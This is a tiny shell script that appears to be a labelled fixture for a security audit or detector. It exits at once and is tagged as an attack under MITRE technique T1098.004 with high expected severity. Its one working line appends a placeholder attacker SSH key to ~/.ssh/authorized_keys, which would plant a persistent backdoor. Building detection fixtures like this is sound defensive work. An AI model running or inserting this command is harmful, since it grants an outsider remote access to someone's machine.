#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1098.004 | expect: high
mkdir -p ~/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAttackerKeyAttackerKeyAttackerKey0000 x@y" >> ~/.ssh/authorized_keys
